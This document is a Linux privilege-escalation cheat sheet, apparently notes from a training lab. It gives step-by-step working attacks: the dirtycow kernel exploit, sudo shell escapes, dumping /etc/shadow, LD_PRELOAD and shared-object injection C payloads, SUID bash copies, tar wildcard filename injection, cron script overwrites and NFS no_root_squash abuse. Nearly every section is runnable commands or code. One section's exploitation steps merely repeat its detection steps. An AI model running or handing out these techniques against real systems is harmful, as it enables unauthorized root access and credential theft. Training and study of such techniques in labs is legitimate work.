# Privilage Escalation

### Kernel Exploits

**Detection:**

1. In command prompt type:`/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
2. From the output, notice that the OS is vulnerable to “dirtycow”.

**Exploitation:**

1. In command prompt type: `gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w`
2. In command prompt type: `./c0w`
   * **Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.**
3. In command prompt type: `passwd`
4. In command prompt type: `id`

### Stored passwords&#x20;

`cat ~/.bash_history | grep -i passw`

### SSH Keys

**Detection:**

1. In command prompt type: `find / -name authorized_keys 2> /dev/null`
2. In a command prompt type: `find / -name id_rsa 2> /dev/null`
3. Note the results.

**Exploitation:**

1. In command prompt type: `chmod 400 id_rsa`
2. In command prompt type: `ssh -i id_rsa root@<ip>`

### Sudo (Shell Escaping)

**Detection:**

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo.

**Exploitation:**

1. In command prompt type any of the following:
   1. `sudo find /bin -name nano -exec /bin/sh \;`
   2. `sudo awk 'BEGIN {system("/bin/sh")}'`
   3. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
   4. `sudo vim -c '!sh'`

### Sudo (Abusing Intended Functionality)

**Detection:**

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo.

**Exploitation:**

1. In command prompt type: `sudo apache2 -f /etc/shadow`
2. From the output, copy the root hash.

### Sudo (LD\_PRELOAD)

**Detection:**

1. In command prompt type: `sudo -l`
2. From the output, notice that the `LD_PRELOAD` environment variable is intact.

**Exploitation:**

1. Open a text editor and type:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

1. Save the file as x.c
2. In command prompt type: `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
3. In command prompt type: `sudo LD_PRELOAD=/tmp/x.so apache2`
4. In command prompt type: `id`

### SUID (Shared Object Injection)

**Detection:**

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command line type: `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
4. From the output, notice that a .so file is missing from a writable directory.

**Exploitation:**

1. In command prompt type: `mkdir /home/user/.config`
2. In command prompt type: `cd /home/user/.config`
3. Open a text editor and type:

```c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
    }
```

1. Save the file as `libcalc.c`
2. In command prompt type: `gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
3. In command prompt type: `/usr/local/bin/suid-so`
4. In command prompt type: `id`

### SUID (Symlinks)

**Detection:**

1. In command prompt type: `dpkg -l | grep nginx`
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

**Exploitation:**

_Linux VM – Terminal 1_

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: `su root`
2. The root password is `password123`
3. Once escalated to root, in command prompt type: `su -l www-data`
4. In command prompt type: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

_Linux VM – Terminal 2_

1. Once logged in, type: `su root`
2. The root password is `password123`
3. As root, type the following: `invoke-rc.d nginx rotate >/dev/null 2>&1`
4. Switch back to the previous terminal.\


_Linux VM – Terminal 1_

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: `id`

### SUID (Environment Variables #1)

**Detection:**

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env`
4. From the output, notice the functions used by the binary.

**Exploitation:**

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env`
4. From the output, notice the functions used by the binary.

### SUID (Environment Variables #2)

**Detection:**

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings `/usr/local/bin/suid-env2`
4. From the output, notice the functions used by the binary.

**Exploitation Method #1:**

1. In command prompt type: `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
2. In command prompt type: `export -f /usr/sbin/service`
3. In command prompt type: `/usr/local/bin/suid-env2`

**Exploitation Method #2:**

1. In command prompt type: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

### Capabilities

**Detection:**

1. In command prompt type: `getcap -r / 2>/dev/null`
2. From the output, notice the value of the “cap\_setuid” capability.

**Exploitation:**

1. In command prompt type: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
2. Enjoy root!

### Cron (Path)

**Detection:**

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the value of the “PATH” variable.

**Exploitation:**

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
2. In command prompt type: `chmod +x /home/user/overwrite.sh`
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: `/tmp/bash -p`
5. In command prompt type: `id`

### Cron (Wildcards)

**Detection:**

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: `cat /usr/local/bin/compress.sh`
4. From the output, notice the wildcard (\*) used by ‘tar’.

**Exploitation:**

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
2. `touch /home/user/--checkpoint=1`
3. `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: `/tmp/bash -p`
6. In command prompt type: `id`

### Cron (File Overwrite)

**Detection:**

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: `ls -l /usr/local/bin/overwrite.sh`
4. From the output, notice the file permissions.

**Exploitation:**

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: `/tmp/bash -p`
4. In command prompt type: `id`

### NFS Root Squashing

**Detection:**

1. In command line type: `cat /etc/exports`
2. From the output, notice that “no\_root\_squash” option is defined for the “/tmp” export.

**Exploitation:**

_Attacker VM_

1. Open command prompt and type: `showmount -e 10.10.0.170`
2. In command prompt type: `mkdir /tmp/1`
3. In command prompt type: `mount -o rw,vers=2 10.10.0.170:/tmp /tmp/1`\
   In command prompt type: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
4. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
5. In command prompt type: `chmod +s /tmp/1/x`

_Linux VM_

1. In command prompt type: `/tmp/x`
2. In command prompt type: `id`
